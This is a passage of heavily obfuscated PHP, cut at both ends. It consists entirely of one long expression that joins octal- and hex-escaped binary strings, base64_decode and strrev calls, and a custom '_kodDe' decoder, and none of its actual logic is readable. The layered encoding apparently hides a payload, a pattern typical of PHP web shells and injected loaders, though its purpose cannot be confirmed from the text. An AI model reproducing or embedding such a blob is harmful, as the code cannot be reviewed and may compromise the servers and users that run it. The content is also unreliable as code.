;k`ஆ')."\107\104\255\147\261\104\126\22\41\312\176\307\264\130\125\254\66\126\35\253\131\351\212\31\3\144\356\254\24\107\204\54\31\41\37\151\121\13\13\261\165\246\47\22\131\104\164\352\203\141\217\267\233\326\2\260"._kodDe('LARebP4q9d+iza6t0H7xiV+uzobXkuefkhEJ56mttK3R72m57c5h5WTN2y4Q3VWpay9eSu/nRGHp')."\271\347\275\215\17\155\73\357\332\55\67\377\277\255\27\334\267\355\342\23\160\302\7\327\335\266\345\324\153\131\305\244\17\316\175\160\353\31\327\154\75\377\326\255\353\157\336\162\377\271\133\36\70\156\313\275".base64_decode('9zpA7g9OXL9t481bT75g69W/3XrXaVt/t37LqVduuejabWfcsuWq47esW//+LedPttMOjvfTUSA=')."\xb7\xc9\xee\x15\x31\xa3\xb6\x1a\xf7\x6c\xcc\x98\xe\x7b\xb5\x6\xfc\x56\x43\xd\x55\xf0\x4b\x15\xf3\x0\xc5\x45\xa0\x79\x49\xaf\xd7\x6f\xd7\xf8\x16\xa3\xc4\x48\xb3\x16\x13\x5\xa4\x69\x26\x34\x18\xc4\xc8\x93\xc6\xe3\xc8\x8".base64_decode('YNqEtVhDhl6olFAZnz/iDQc6/EQHkg3UVKSLRy6pATQSXszCzCyizLRWqqamtTWSpSGyK6kBYbc=')."\200\52\53\125\101\245\217\52\7\344\244\110\106\221\252\340\112\0\0\112\22\314\266\152\150\241\207\324\313\246\55\233\346\250\163\324\327\110\304\356\26\347\40\166\266\122\25\261\261\145\371\54\37\161\44\54".base64_decode('sXpHXY1UVRysIvXi/QpqH8eYhiQ7qkmFxepyXMD/DFOXVSB1SEkHA7H84NdiO5t08Rx4nACGHSY=').strrev('(j[	PcxB"tFthΖl$+LA)+H&rlLV}zy')."\x45\x43\x5\xa1\x78\xb4\x28\xae\x6\x9a\x1\x6\x7\xe3\x83\x0\x4b\x19\x54\xc6\x78\x49\x80\x13\xb1\x4\x3a\x82\x10\xce\x6\xb1\x42\x1a\xb2\x85\xae\xc2\x62\xb\x6e\x67\xde\xc8\x50\x2e\x47\x8c\x71\x7b\x96\xb1\x36\x50\x5a\x26"."\103\240\160\113\152\150\37\341\217\172\273\60\225\107\4\62\117\45\246\132\10\225\167\247\144\41\221\34\265\235\43\170\170\272\100\206\260\27\302\13\364\166\6\303\75\330\56\40\342\355\362\367\170\134\204\177"."\x63\x4a\xc0\xf8\x50\x5e\x90\x5a\xa5\x69\x90\xf3\x61\xd0\x34\x4b\xf7\xa3\xf\xd1\x2e\x8b\xa2\xaf\x82\x79\x15\x37\x15\xc3\xc4\xbd\x50\xcc\x90\xca\x90\xd1\x97\x90\xe1\x97\x8c\xb2\xb4\x4e\xc3\x6\x8d\xa4\x48\x66\xf8\x1f\xc\x47"."\343\240\3\10\173\26\270\356\64\141\241\20\125\54\113\272\76\314\366\167\150\217\40\210\44\362\164\56\317\50\51\302\34\323\162\22\154\337\250\171\157\202\172\21\0\125\200\137\366\6\173\73\3\324\120\302"."\x97\xb0\xa4\xf9\xc2\x1\x68\x81\x48\x2a\x27\xd1\x12\xe2\xfc\xd6\x1c\x44\x8a\x23\x29\x16\xe6\xd6\x6d\x30\x81\x2d\xfb\x20\xc2\x57\x7d\x98\x22\x38\x33\x80\x9f\x89\xf4\xb2\x30\x17\xda\x40\x4\x2a\xb6\x71\xe\xbc\xc4\xc7\xc2\x5d"."\314\306\11\46\4\303\102\304\23\366\364\104\130\64\274\4\160\164\10\23\154\171\172\74\221\50\150\125\157\137\17\347\372\335\236\305\200\140\202\134\56\241\34\273\332\125\333\136\23\303\226\12\70\210\177\346"."\321\30\324\366\36\130\135\357\220\232\327\326\20\34\252\333\37\67\263\140\363\22\347\137\131\324\35\357\16\316\307\161\344\144\301\137\110\161\271\132\352\227\200\334\31\345\162\247\101\227\57\66\43\44\100\307"."\x12\x36\x7f\x92\x7a\x83\x4b\x3c\xdc\x62\x5f\x48\xc0\x10\x22\xd9\x4a\xdc\x8e\xdf\xbd\xa2\x3f\x36\x12\x73\x1\x91\xc1\x58\xc9\xd\x10\x7c\x1d\x12\x15\x46\xbc\x70\xff\x45\x34\xe3\x49\x6e\xf\x5d\x51\xe9\xd2\xe1\x20\x81\x78\x4e"."\313\60\171\260\327\107\5\10\374\273\224\6\20\367\44\31\300\156\254\230\243\6\11\330\22\42\36\133\23\73\72\346\164\141\343\17\50\311\304\34\274\146\161\377\122\260\352\106\42\26\313\225\70\262\140\47"."\xa5\x83\x36\x93\x10\x9e\xc7\x38\x32\x97\xfc\x90\x3d\xc5\x5c\xd2\x13\x24\xda\xd6\xca\x86\xd6\xbf\x68\x4d\x2f\xf8\x9b\x1f\x5d\xe3\x7\x7f\xdd\xe0\xa7\x3b\xa\x6\x4f\x65\x8\x60\x92\x76\x7\x16\xfa\xd7\xc0\x7f\x78\x42\x8d\x24"."\x22\x4\x7a\xd7\x80\x7f\x1\x8b\x59\x13\xe8\xb5\x67\xee\xf0\x47\x97\xf8\xfd\x18\x81\x86\xc9\x2f\x47\x5\x2c\x87\x34\x4d\x70\xc1\xb1\x20\x48\xd\x95\xa4\x6e\x7f\x67\x54\x82\x71\xfa\xd9\x78\xbc\x1a\x75\x9e\x73\x60\x7a\x4d\x3c"."\356\66\372\10\265\60\103\317\352\151\123\352\247\221\125\304\23\361\162\376\153\241\203\162\22\100\152\276\326\361\147\56\45\110\174\176\70\330\27\22\342\135\236\305\201\336\371\64\346\256\245\241\132\152\10\357"."\xb\x44\x40\x17\x79\x29\xd\x72\x4f\x17\x62\x9c\x88\x9c\x48\x30\x12\x45\x5e\xb\x41\xfb\x0\x6f\x7\x11\x41\x10\x87\x3b\x0\xcc\x9b\xad\x73\xac\xa3\x2f\xd0\xed\x13\x8d\xf3\x20\x22\x59\x52\x10\x5f\x27\xab\xca\x54\x5a\x39\x1a"."\x47\x66\x7a\x34\x2\xbb\x9c\x86\x11\x79\xd1\x8\xea\x3\x1a\xc1\x1d\x40\x63\xa8\xbb\x68\x4\x79\xd4\xa0\x11\xd4\x50\x1a\x81\x5b\x12\x7f\x2f\x4d\x3\x7b\x3c\xb0\x3f\xa3\x1b\xb7\xc\xd7\x12\xcd\xca\xc3\xcc\xe8\x64\x4e\x2a\x21"."\330\223\332\216\264\320\121\215\37\216\33\131\44\220\252\225\44\330\264\301\263\61\341\114\303\275\262\77\146\304\42\3\265\355\53\51\31\142\273\51\63\252\232\314\16\16\175\204\70\237\0\37\11\40\263\25"."\341\63\144\375\346\207\36\326\75\16\343\25\53\331\326\205\130\230\72\310\257\316\53\147\125\202\203\20\62\142\373\340\237\30\301\215\221\155\13\61\52\231\346\240\13\152\234\333\47\232\172\111\320\270\144\332"."\220\110\11\254\224\200\51\142\137\241\63\30\320\177\324\44\10\55\345\244\236\246\46\161\54\253\22\47\265\105\304\176\103\354\32\132\42\230\53\171\361\263\125\252\250\154\52\171\113\206\76\301\34\110\116\161"."\23\30\231\31\361\230\131\156\356\44\372\352\360\165\340\337\74\124\140\216\50\71\162\12\356\113\40\305\66\256\52\315\272\303\20\24\336\320\331\17\157\37\166\214\142\313\110\112\12\260\52\13\130\34\330\315"."\235\163\250\232\67\7\126\122\156\24\14\17\146\370\107\306\125\172\262\313\252\124\320\102\212\236\127\321\361\322\22\256\36\313\322\25\76\154\110\7\231\35\234\243\163\276\202\325\115\110\251\0\276\20\142\43"."\342\254\247\310\324\245\22\42\2\211\211\65\114\347\23\14\5\312\53\150\20\42\57\45\244\130\75\207\51\145\262\255\162\246\246\365\310\205\261\250\266\130\125\310\205\200\57\270\244\267\73\110\175\23\120\167".strrev('-2"R]d'."\0".'3\\\'St& :ϩ2&@b4]Ё?Kd$')."\x60\x5f\x98\x9e\x3e\xc0\x38\xb2\x27\x8\xfb\xbd\xcb\xd8\x69\x0\x83\x76\x7a\x16\xdb\x21\xb0\xb8\xa8\x67\x7e\x45\x30\x13\xe6\x20\x1c\xf1\xcd\x78\x38\x8\x25\x5f\x7f\x77\xa7\x2d\x43\xa4\x8b\xf9\xb8\xb0\xc2\xe2\xdd\x81\xde\x85"."\25\23\242\301\170\217\220\5\3\301\376\267\307\16\263\226\20\361\303\256\340\361\216\356\240\127\110\16\4\313\173\2\60\153\33\20\213\306\164\101\255\216\255\106\147\11\55\355\325\261\324\32\270\274\72\343"."\140\165\156\217\255\255\251\216\271\333\135\265\114\46\304\103\43\150\317\127\6\253\106\324\302\304\334\56\27\51\200\5\200\104\312\154\163\51\15\22\157\71\21\154\321\150\371\2\131\321\327\12\336\51\240\201"."\x86\xcb\xee\xcd\x22\x80\xcf\xf5\xe2\x91\x65\x11\xd6\x93\x58\x8b\xbe\x52\xba\x85\x76\x30\x9a\x78\x90\x6c\x43\x6\x7f\x21\x11\x35\xaa\xe4\x8b\x15\x11\x2d\xc4\x67\xb1\x2f\x10\x41\x2e\x55\xe3\x3d\x14\x41\x20\xd1\xa0\x9\x23\x71"."\214\325\252\326\102\147\142\262\4\315\52\171\177\363\131\14\100\104\5\276\201\136\147\55\163\346\235\251\130\164\76\164\306\20\133\316\62\250\272\340\15\41\251\25\122\310\1\4\231\252\162\222\336\321\224\300".base64_decode('VoweysIFwnCOqLRKU5gVJblnicvIBjgu3oINOQ01U3DKuYwGeGI2T6HyoCWde9IoamCjSX25OcE=').strrev(']d2!CCZ:'."\0".'fK2(#:u^"jE~Yز8b0$3'."\n".'4\'').strrev(']1=^c X+\\MbvA:fh)pfV|*-')."\100\43\37\321\135\230\147\111\244\311\331\325\343\361\72\1\207\151\240\367\317\313\362\200\114\272\124\106\44\362\210\321\24\207\366\364\12\135\2\247\67\113\131\320\253\144\364\313\275\221\114\261\372\274\301\100"."\xec\x2c\x3\x8\x75\x29\x78\x92\x4f\x97\x57\xc\xb5\x51\x5\x6\x72\x19\x2\xc7\xb1\x11\x36\xbd\xfe\xc9\xca\xac\xc2\xb0\x19\x38\x54\xe9\xbb\x4b\x2b\x7e\x77\x69\xa5\xef\x2e\xb5\x7d\x77\x69\xf9\x77\x31\xc8\x46\x7d\x72\xb1\xe8"."\xc5\x9e\xb2\xc4\x39\x6b\x1\x25\xc5\x8\x65\x7e\x69\x78\x6f\x21\xde\x77\x10\x61\x15\xdf\x53\xbb\x40\xb2\x4f\x35\xa0\xf8\x9b\x62\xf8\x6\xf\x31\xa\x4f\xb\xb4\x6f\x29\xee\x7\xfd\xd6\x48\x94\x1b\xb3\x82\xa0\xc\x84\x38\x2a"."\206\114\45\232\7\100\4\62\241\104\300\367\371\320\252\260\207\111\41\72\245\154\267\146\30\25\56\105\1\124\302\336\44\113\230\337\110\110\34\124\240\47\100\325\220\344\104\101\323\363\164\154\210\33\40\346"."\321\205\371\173\341\116\141\360\66\12\207\375\314\120\260\107\36\365\144\224\210\2\331\30\351\50\377\150\121\63\24\321\225\120\112\101\56\52\230\71\211\74\12\231\13\275\375\223\365\101\232\62\352\4\265\266"."\xf9\xb4\x31\x14\x65\x90\xa\x6c\x82\xa0\xcc\x84\xe3\x10\xf3\x55\x63\xaf\x1b\xec\x41\x67\xde\xe2\xb8\x8b\xba\xd1\x11\x9d\xe\xa8\x16\x43\x4d\xce\xf1\x74\xee\xb5\x8\x9d\xc0\x39\x2b\x2\x9c\x82\x39\x16\x66\xf\x82\xd7\x38\xd0"."\x90\xc\x1b\xd\x27\x99\xd0\x59\xd4\x33\x54\xb1\x2\xff\x2c\xaf\x54\x3d\xa7\xce\xfd\xf\x5\x23\x11\xec\x4b\x6d\xa1\x32\x46\x3d\xf9\xd8\xa6\x84\xcd\xf9\x4f\x6c\x7e\xac\x27\x16\x15\xfb\xd5\xd4\xe5\x74\x1a\x54\x5b\xf0\x17\x62".base64_decode('qQv4hkSbPrGjIrKTPLqiayKSiNxluQEGNCUeiTNKRf4bK9Aqgv94ahVJBsqpdIbyW/ViSXBBimU=')."\xe2\x10\xf2\x36\x45\x99\x8a\xb0\x23\x40\x5e\x9e\x88\x27\x35\xe6\x76\x9\x74\x6b\xa1\x43\x4b\x91\xc5\x70\x75\x15\xa0\xd7\xaa\x96\xaa\x29\xd5\xe0\xb7\xa6\xca\x51\x5\x85\x1f\x14\x87\x23\xc\x1\xe8\xdb\x55\x2d\x53\xaa\x51\xa0"."\206\130\63\216\23\375\46\301\155\12\77\351\44\262\176\273\154\232\302\16\275\35\365\35\234\370\15\356\6\367\10\341\61\355\103\360\213\334\47\242\175\301\30\215\3\36\111\165\47\342\42\247\46\153\0\31"."\x23\x31\xa5\x8b\xd5\x84\xf2\xf0\x1e\xdf\xc\xca\x72\x3d\x3d\xcb\x9d\xdc\x91\xd1\xdc\xf6\xd1\x7c\x4e\x22\x8e\x87\x5a\xa7\xd5\xbb\xea\xa6\x49\xd4\x49\x66\xeb\xb4\xbe\x68\xa7\x73\xd6\xb4\xf6\xb6\x49\x73\xbd\xe8\xa8\xce\x54\x7a"."\340\131\33\164\42\205\75\106\266\221\155\373\134\70\127\131\304\155\215\115\224\227\360\276\274\74\256\25\300\272\10\166\273\171\127\222\164\146\351\277\341\161\334\75\125\101\61\107\64\235\234\130\62\241\215\252"."\x8e\xa\x8c\x2b\x6f\x90\xe9\x8b\xed\x32\x5b\xe0\x1\x1\xed\xa1\xbe\xe2\x58\xa9\xe0\xf4\x2\xc9\xc1\x89\xe5\x9d\x96\x4a\xb\x62\x4b\x9d\x15\x1f\xfa\x9\xb5\xe2\x8b\x7c\x15\x72\xac\xb8\x8d\x63\x71\x86\x94\xe7\x41\xec\x5\xb0".strrev('(U+BSs'."\n".'YpmճbtIER'."\n".'ar	SnP~'."\n".'C]E').strrev('5 Dj)C^%K;%SPjW|)'."\r".'RpBteBYp')."\121\303\61\324\42\313\313\200\2\230\370\156\337\16\10\247\70\345\236\323\300\254\227\32\32\133\146\314\156\241\32\305\107\323\43\357\122\321\154\145\101\352\131\155\262\73\115\31\10\367\164\110\133\14\307\334"."\342\116\116\0\363\316\145\254\201\162\36\13\36\257\255\305\333\45\151\50\336\114\12\116\364\52\160\332\224\62\114\127\141\262\10\13\212\133\154\64\62\64\240\63\174\231\117\206\104\156\220\127\70\1\257\260".strrev('YE.s@63'."\r".'S-&arMLHUaRٓCf\\h-')."\x25\x29\x60\xb1\x86\x22\x25\x74\x91\xe9\x82\x4b\x5e\xb8\x24\x78\xee\xb5\x2a\x80\xc5\xc1\x7a\x65\xd3\x7c\x13\x1d\x81\x87\x72\x25\xe6\xb0\xb1\x88\xc2\xa4\x49\xa1\xee\xbe\xf9\x81\x5e\xe1\x56\x4b\x0\xc4\xbd\xbe\xde\xb8\x27\x14".base64_decode('qphARgjp5rihg0jXKuolOEmpba6az0hJeBLXWgWhVZKhJ6lTnio3YcwIgW/Y5qokyzSYRUqDNjk=')."\121\10\47\117\153\233\353\126\333\50\363\6\373\43\110\345\141\215\12\307\154\333\64\314\216\302\52\236\361\171\222\66\227\211\136\271\260\270\74\13\54\334\225\254\224\344\106\147\134\156\301\325\46\331\363\213".base64_decode('ikUW9xjW4092wFZhUIpychAOPOfHONlFEkJwW4ITLK78TOEEHVQcfApuS3U1k6UHMqtxQXDhXrs=')."\xb6\x1c\x46\x2e\xdd\xed\x49\x9e\xa2\x6a\x7\xc1\xf1\xb2\xc3\xe0\xce\x9a\xc3\xc0\xc2\x62\xfd\xc\xa6\x15\x11\x89\x43\x28\x4e\x77\xef\xfc\x7e\xaa\xb2\x82\x62\xb1\xfe\x69\xae\xda\xb5\x6b\xdd\x2a\xbd\x6b\x8a\x55\x51\x5c\x4c\xdf"."\56\206\215\343\61\227\25\37\124\216\364\46\103\44\0\73\46\26\362\26\20\52\236\344\256\345\52\221\354\116\111\202\27\115\255\255\155\375\354\340\163\200\246\121\361\114\255\237\105\307\161\74\353\214\56\141".base64_decode('QW8vF1cZ5eKJ6UL6px6rS6P2YeY8U1SBw2FPsShGqYN/6AfFnVMTbjZt3AjmSnIVTIqCJq0NDi8=').base64_decode('hGwJUGEWgYcBGwLCzio7HJTFgCww10jqatG0THjsMr4KuTtdJQ/LGKVKog6rq5DztiowwXEKmeU=')."\274\52\163\41\143\227\164\45\327\132\205\252\153\144\25\5\344\317\2\271\274\342\107\100\306\52\211\262\231\274\314\172\114\67\65\260\262\60\315\107\342\326\267\57\114\224\315\74\275\313\54\222\314\121\53\360"."\357\224\243\30\143\205\336\240\163\100\104\104\32\65\210\225\240\243\360\64\77\215\42\56\224\103\341\140\64\350\245\256\143\53\35\133\65\121\261\321\300\312\255\174\327\101\225\35\27\372\227\131\61\330\222\353"."\46\20\62\374\172\251\120\140\327\166\120\22\144\13\106\2\271\53\210\144\113\46\137\152\240\237\267\50\124\134\67\10\130\360\223\1\275\164\50\51\27\135\141\231\277\26\2\257\220\3\37\202\302\362\350\164"."\x10\xdc\x5a\xd2\x2f\xe5\x34\xea\x28\xa4\xa1\xae\xae\xce\x59\x57\xf\xfe\xcf\x2e\x41\xc8\x27\x5a\xa8\x4d\x8f\x80\x52\x57\xd7\x82\xfe\x8f\x13\xd0\xa1\x28\xe9\x50\x6b\xa\x98\xbf\x94\x97\x10\x84\x11\xb0\xf7\x27\x21\x82\xa2\x16"."\112\124\344\0\375\205\174\164\264\320\211\76\107\330\106\315\221\24\330\72\22\123\354\55\355\326\62\226\101\241\134\36\316\154\32\6\353\76\30\16\324\162\332\223\364\276\22\240\361\201\6\365\360\27\122\104"."\x9a\x9f\x83\x35\xa8\x5b\xc5\x8f\xb9\x68\xf\x8a\x40\xf1\xc0\xd9\x64\x69\x96\xef\x3\x28\x58\xf2\x92\xac\xea\x10\x20\x1c\x2e\x40\xb9\x44\x70\x52\x2\xa3\xe2\x2d\x20\x4a\x66\xba\xbc\x28\x96\x63\xb6\x21\x30\xda\xcb\x4a\xaa\x44"."\102\131\155\44\316\127\60\30\135\300\142\250\117\340\146\200\22\13\153\75\351\30\312\370\50\161\320\33\62\162\73\205\14\56\6\325\234\105\207\76\56\224\55\72\67\4\374\5\112\215\164\130\361\1\67\371"."\x0\x74\xa\xe2\xe2\xbd\x87\x7c\x5f\x21\x27\xf7\xf8\x52\xbb\x65\x92\xd0\x93\xba\xc6\x35\xd9\xcb\x1e\x6d\xa0\xb1\x48\xe5\x9b\x58\xe1\xdc\x89\xc2\x26\xc0\x64\xc7\x52\x14\xe2\xa7\x0\x7c\x57\xea\x65\x9e\x3c\x84\x2\xec\x49\xb6".base64_decode('PJ6U8DaBwV14eJlLINGvB3ZaItxBGsThHHcWRMtgrS/pOVdR1zJgJAyhXhAeqgxm6OWYFZBYg0Q=')."\74\21\10\65\10\250\133\174\102\124\354\4\35\154\271\30\133\24\120\271\355\210\0\264\152\3\10\11\136\346\106\126\4\302\15\100\237\260\251\143\37\265\122\7\24\326\155\45\223\164\176\107\15\167\327\342"."\61\244\252\171\11\5\300\66\361\13\53\53\274\214\126\10\235\267\22\2\177\167\335\331\64\160\56\341\20\250\272\354\250\107\74\310\254\60\202\326\121\52\33\16\104\327\135\360\42\207\315\144\41\206\56\263".base64_decode('XcjTHRdZbVH7hTfiUSZlM9RJV4E5yIVNxVwbxyt8gWRiWVz0/tuVTGdsIEYYZQCFS+dI2xOIjJQ=')."\xb7\xf5\x68\xe3\x80\xf7\xc8\xee\x19\xae\x3a\xa9\x7a\x89\xa\xe4\xa2\x11\x43\xea\x8d\x4a\xcd\xae\x86\x39\xd2\x92\xe0\x92\xe6\xa6\x1a\x9\x48\x68\x39\x65\x89\x92\x58\xa8\x9a\xee\x19\x8d\x33\x5d\x8d\xcd\x52\xf5\xc2\xae\x68\x4f"."\xb7\x43\x82\xa6\x2f\xd2\x7c\x20\xf1\x69\x35\x92\x37\xab\x6b\x79\xc5\xdd\x30\x13\x9a\x18\x34\xcd\x68\x74\xcd\x6e\x92\x22\x72\x5a\xd6\x55\x92\x8b\x70\x38\xa2\x1e\x39\x42\x7e\xe1\x13\x4b\x71\xa1\xca\x71\x61\x57\x8a\x17\x69\xca"."\x19\x91\xe\x28\xbe\xe1\xea\x87\xb9\x88\x62\x1f\xa0\x66\xf4\x4e\x93\x98\x11\x5d\xe9\x13\xd\x1e\x71\x97\xb\x71\xad\x74\x60\x2d\x16\x22\xc\x70\x5c\x9\x3e\xca\x62\xb9\x54\x3b\xf2\x34\xca\x89\xc1\x74\xe1\xd3\xe\xb2\x75\x81"."\324\140\224\21\26\124\171\316\211\257\333\54\121\123\354\112\272\77\146\14\324\306\334\75\112\112\225\73\264\121\34\355\107\77\110\53\22\252\230\325\300\350\364\377\46\132\33\33\240\52\111\360\203\135\12\337".strrev('N.$7b'."\0".'Q{'."\r".'>Qi/\\*Lw.j6ΎN|8').base64_decode('tVQpSYsMWWLFVHqxuF/0kSmEBCrxXZpRIFGzFumxwgCa5hCK2oFhtZa2Ydj0qVP9wU6misgxRhs=')."\352\6\254\261\366\352\376\102\172\240\275\246\32\146\134\103\140\270\24\332\275\364\264\303\122\25\361\253\226\356\235\256\45\126\271\125\262\231\163\23\372\101\165\233\73\267\332\125\133\323\326\306\367\172\156\110"."\x84\x96\x12\x58\x9d\xa1\x3\xc3\xf2\xb2\x2d\x91\x30\x45\xd6\x99\xb3\x43\x37\x10\x1a\xf4\xb1\xe2\x8f\xce\xa9\x60\x74\x92\x19\x5e\xde\xfd\xd8\x9c\xee\x80\x8f\x74\x78\xff\x0\xe\xcc\x5\x7d\xb2\xa2\x6d\xa0\xb6\xa6\xbf\xad\x2".strrev('  Qye LȦi:69Lpʣ.X+#c~&p').base64_decode('YmAARTiK4s3tl51pVNc2gMz0W+e6atum0MzoYoESyD6TqC1SVy37+minH/wxojyaFI/uHAgy4Mo=')."\x4e\x7f\x6f\x34\x10\xd\xf8\x89\x2\xf7\x2e\x7b\x4d\xda\x7b\x1f\xd2\x7\x44\x59\x72\x9f\x49\xb4\x48\xd0\xb9\xb1\xd1\xba\x3a\xf0\x37\x1b\xfc\xc9\xe0\x2f\x9\xfe\x52\x90\x84\x63\x6\xf8\x77\x16\xf8\x3\x29\x8d\x0\xda\xa8\xc4"."\x46\x67\x24\xc0\x1f\x48\x9d\x9\x7e\x67\x42\xac\x34\xf8\x9b\xc1\xb9\x48\x5b\x1b\x2f\x18\xb4\xd6\xe3\xec\x4\xcd\xae\x54\x38\xc8\xd2\xc6\x28\x5c\xa8\x20\xdc\x98\x53\xe7\x16\xfc\x82\x1\xba\xf7\x57\xa8\x17\x83\xb4\x9c\xa3\xab"."\xa3\xf8\xf4\x13\xfc\x64\x4c\x87\xf3\xe\xce\x3a\x3e\x3d\xaa\xa1\xd9\x1f\xc2\x83\xb3\xb5\x42\x4d\x38\x2e\xc3\xb4\x34\x62\x22\x1a\xee\xfb\x61\x2c\x71\x1a\xb3\x66\x4d\x77\xba\xea\xea\x1b\x1a\x9b\x66\x34\xcf\x9c\x45\x4e\xae\xb"."\xa5\xbc\xa2\xd3\x53\x11\x37\xf2\xf4\xd7\x8\x7f\xd4\x14\xfd\xe1\xe7\x2d\xd6\x73\xdc\xa2\x41\xed\xdf\xf3\xcc\xb4\x1c\xf0\x46\xba\xec\xb\xca\x39\x86\xa8\xce\x34\xa8\x8c\xf5\xd0\x43\x4\xb8\x54\xa6\xe1\xd5\x10\x49\x9b\xd5\x11"."\x22\x94\xe3\x8e\xf5\x43\x6e\x13\xa3\x94\x8\x9d\x9d\xa\xa\x32\x24\x16\xc9\x52\x37\x1d\x53\xeb\x1a\x52\x2d\xec\x1f\x1b\x8c\x8a\x44\x19\xc3\x25\xd4\x15\xbf\xf5\x23\x97\x40\x9b\xa8\x6a\xd6\xaa\x62\x86\x57\x2c\x2a\x3c\xb\x4".base64_decode('iMDw4utL4QwYliiULRwcojh8J4nKPhiQS1C/A2KaAJ7nAvJS2uVfGuh0eeEzR5EiMzY2wvOJiig=')."\xb\xa0\xca\xbb\xe0\xce\xac\xa0\xe4\xe8\xed\x2b\xbc\x78\xb\xb3\x35\xe\x34\xc9\xb1\xaa\xa8\x64\x1c\xc5\x42\xc6\x91\x51\xd3\x8e\x44\xbe\xe8\x30\xd5\x74\x1a\xfe\xe3\x0\x63\xe8\x28\x26\x53\xe\x63\x38\xe3\x50\xd2\xf2\xa8\x63"."\x44\x49\x14\xa9\xb\x67\xbd\xc1\xa1\xe8\x69\xc7\x60\x2a\xe9\x48\x25\x75\x47\xa\x14\x50\xd0\x47\x1c\x5\x25\xed\xd0\x0\x5c\x1f\x69\x70\x14\x41\xd8\x0\x30\x19\xfc\x19\x3a\xf1\xed\x30\xac\xa6\x14\xd\xec\x7f\xc\x2d\x57\x42"."\312\120\243\23\300\307\250\30\104\41\113\55\275\20\350\364\325\271\226\206\131\352\250\143\202\4\173\61\313\276\267\230\61\113\61\313\354\305\210\211\76\352\173\173\36\36\22\32\307\57\67\311\71\350\313\233"."\xfc\x37\x9a\x2f\xba\xe0\x1f\x12\x23\x14\x88\xe8\x40\x63\x3e\xf\x3a\x2c\x10\xb4\x19\x5c\x14\x11\x5d\xd2\x8c\x71\x61\x44\xd3\x55\x20\x19\xcb\x95\x2b\x12\xb4\x27\x1a\x5a\xda\x1c\x61\x6a\x55\x22\x6a\x84\xa4\x8\x75\x23\x15\x61"."\x29\x24\x6e\x94\x63\x5a\x5a\xa1\xe9\x51\xf6\xb6\x49\x42\x35\x43\x60\xaf\x2c\x73\x3d\x43\x3c\x9a\x0\x6e\xc4\x8b\xd0\x80\x52\x48\x82\x40\x80\x1d\x52\x47\xa9\xd1\xf2\x3c\x17\xbe\xce\xe5\xf8\x45\x98\xe8\x60\x70\x5d\x1e\xb1\xa5".base64_decode('ESK0TYLKEwSUA2cHLQweXsbh2aXQsnmuQJcv7ELlIVs7/m14R6mLNvH4o0zAZoiZnJaQc3FcBr8=')."\71\222\13\200\253\60\217\7\363\134\70\16\112\163\131\123\62\124\205\51\247\25\62\252\131\112\131\333\64\77\24\101\125\51\201\14\56\33\112\16\224\367\3\31\54\30\162\356\207\360\255\30\51\145\130\115"."\52\75\362\140\5\202\202\120\112\62\171\206\201\163\160\36\157\311\1\17\100\130\26\376\4\17\142\276\76\166\172\47\146\11\320\44\170\144\15\272\216\346\106\131\122\34\56\24\344\21\130\250\130\24\146\255"."\264\0\221\321\46\1\147\244\106\213\36\100\150\120\147\247\123\334\171\220\142\274\301\236\120\137\324\357\163\125\104\242\100\341\222\101\244\312\12\311\360\304\30\354\314\321\231\341\4\271\46\100\101\72\134\240"."\60\176\312\51\146\52\117\355\204\332\373\242\12\240\210\136\226\50\0\2\205\306\31\371\174\247\232\253\260\20\175\17\32\110\52\31\76\320\301\162\301\66\103\131\37\126\100\11\104\202\250\241\140\225\342\317"."\xa2\x8a\x5f\xac\x88\xb0\x24\xab\x9a\x4a\x87\x9c\x2b\xfb\x14\xca\x52\x9e\x4a\x7b\x87\xab\xea\x55\xea\x3b\x9e\x4a\x21\x1d\xaa\x6c\x4c\x30\x4a\x65\x28\xfe\xc5\xc2\x42\x4c\x82\x72\xd2\x21\xa7\x4c\xc3\x21\x97\x1c\x72\x5e\x77\xc8"."\xc3\xba\x23\xa1\x15\x6\x1d\x29\x23\xd\xfe\xc\x7\x58\x7a\x61\x72\x3a\x7\x10\x73\xb2\x23\x7\x18\x98\x23\xaf\xa6\x54\x47\x1e\x4\x54\xd3\x31\x9a\x77\x18\x8d\x79\xb2\x8\xe7\x8b\x20\xb1\xd8\xe8\xd0\xd2\xba\x43\x1f\x4\x45"."\32\131\70\67\6\35\43\362\260\143\44\57\73\362\115\262\103\313\144\34\303\103\151\307\310\260\143\130\113\72\114\172\314\113\305\244\270\41\352\5\16\225\324\344\40\4\273\340\77\140\134\362\105\43\136\52".strrev(';l'."\n".'M'."\0".'r0>@Oޖ#ۢ~(1%C6p^uԣ')."\321\351\200\75\47\257\117\77\133\5\251\22\124\34\112\152\142\16\134\31\372\11\54\47\10\252\35\60\21\257\134\161\335\162\322\315\334\155\300\343\24\121\104\45\42\27\50\216\72\212\301\53\243\240\201\217"."\x51\x26\x5a\x19\xed\x9f\xb7\x80\xfa\x81\xbc\x3d\x5c\xbf\x6\xfe\xdb\xb0\x46\x6\xbc\x75\x58\xd3\x13\xaa\x41\xdf\x29\x62\x4d\x1f\x10\x85\xcd\x1f\x9f\x49\x64\x86\xff\x45\x2e\x2e\x9f\x66\x94\x82\xfe\x5f\x7f\x55\xc8\x34\xa6\x50"."\13\230\37\237\235\347\1\35\105\15\245\377\213\216\202\231\342\342\223\141\4\311\160\25\325\44\344\324\256\72\27\277\32\101\142\15\235\173\115\140\226\16\73\322\115\160\252\15\203\151\66\354\310\153\303\140"."\x46\xab\xe\x3d\x3f\x9c\x70\xe4\x7\x87\x41\x0\xca\xcc\x79\x30\xf\x41\x58\x1\x22\xa1\x31\x92\x26\x73\xb7\x31\xd3\xe0\x68\xcc\x14\x1d\x32\x98\xf8\x9\x15\x70\x0\x75\x38\xed\x28\x18\xc3\xe\x30\xfb\xc1\xff\x47\x4c\x50\x1c"."\xf8\xcd\x3\x59\x24\xf\x25\xf4\x3c\x10\xd5\x87\xb5\x4\x65\x3b\x50\xfd\xd6\xa5\x15\xa0\xc7\x7e\xe8\xcf\xde\x35\x2\x8f\xee\x1c\x13\x9\xd7\xe5\xf8\x59\x74\xf2\x56\x9e\x61\xec\xbf\x65\x3\xe\xeb\x84\x4d\x92\x43\xb5\xb8\x60".strrev('M~w(`i%V̑0pL"R"県0k,,Y')."\213\117\357\37\302\304\305\376\20\26\142\14\2\22\357\31\214\216\322\343\337\137\105\362\45\41\203\260\207\344\174\223\363\313\65\42\277\134\103\230\335\200\105\370\265\23\7\343\272\60\1\166\2\75\13\45"."\277\145\134\267\137\7\173\106\161\136\125\330\75\20\221\213\62\143\372\354\271\245\42\154\362\175\17\226\215\315\133\230\273\205\105\347\331\342\155\331\11\227\201\321\240\340\160\31\77\327\223\131\225\136\60\241".s